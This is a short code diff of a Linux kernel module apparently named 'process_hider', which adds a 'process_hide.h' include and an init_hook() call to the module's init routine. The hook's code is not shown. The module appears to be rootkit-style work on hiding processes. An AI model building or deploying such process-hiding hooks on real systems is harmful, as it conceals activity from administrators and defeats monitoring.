@@ -8,6 +8,7 @@
 
 #include "consts.h"
 #include "device_handlers.h"
+#include "process_hide.h"
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Rhydon");
@@ -36,13 +37,15 @@ static int process_hider_init(void) {
     cdev_init(&cdev, &fops);
     cdev_add(&cdev, MKDEV(dev_major, MINOR_VERSION), 1);
     device_create(process_hider_class, NULL, MKDEV(dev_major, MINOR_VERSION), NULL, DEVICE_NAME);
+    
+    init_hook();
+    
     return 0;
 }
 
 static void process_hider_exit(void) {
     printk(KERN_INFO "bye...\n");
 }
-
 
 module_init(process_hider_init);
 module_exit(process_hider_exit);
